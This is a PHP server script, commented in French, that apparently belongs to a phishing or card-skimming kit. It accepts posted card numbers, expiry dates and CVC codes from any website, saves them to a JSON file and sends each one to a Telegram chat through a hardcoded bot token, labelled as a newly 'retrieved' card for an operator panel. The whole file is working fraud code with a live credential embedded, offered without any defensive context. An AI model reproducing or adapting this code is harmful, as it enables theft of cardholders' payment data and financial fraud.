<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Méthode non autorisée']);
    exit();
}

$json = file_get_contents('php://input');
$cardData = json_decode($json, true);

if (!$cardData || !isset($cardData['cardNumber']) || !isset($cardData['expiryDate']) || !isset($cardData['crypto'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Données invalides']);
    exit();
}

$cardData['timestamp'] = date('Y-m-d\TH:i:s');

// Sauvegarder dans card.json
$filePath = 'card.json';
$existingData = [];
if (file_exists($filePath)) {
    $fileContent = file_get_contents($filePath);
    $existingData = json_decode($fileContent, true);
    if (!is_array($existingData)) $existingData = [];
}
if (!isset($existingData['sessions'])) {
    $existingData = ['sessions' => []];
}
$existingData['sessions'][] = $cardData;
file_put_contents($filePath, json_encode($existingData, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

// ✅ ENVOI DIRECT À TELEGRAM (sans include)
$botToken = "8791271208:AAE1gIznsKHui2G_5X3P77v3VGzA6iN7whU";
$chatId = "-5520620526";
$message = "💳 *Nouvelle carte récupérée*%0A" .
           "─────────────────%0A" .
           "🔢 *Numéro* : " . $cardData['cardNumber'] . "%0A" .
           "📅 *Expiration* : " . $cardData['expiryDate'] . "%0A" .
           "🔐 *CVC* : " . $cardData['crypto'] . "%0A" .
           "─────────────────%0A" .
           "✅ *Carte sauvegardée avec succès*";

file_get_contents("https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$message}&parse_mode=Markdown");

// Notification panel
$notifFile = 'notification.json';
file_put_contents($notifFile, json_encode([
    'type' => 'new_card',
    'timestamp' => time()
]));

echo json_encode([
    'success' => true,
    'message' => 'Carte sauvegardée avec succès',
    'total_sessions' => count($existingData['sessions'])
]);
?>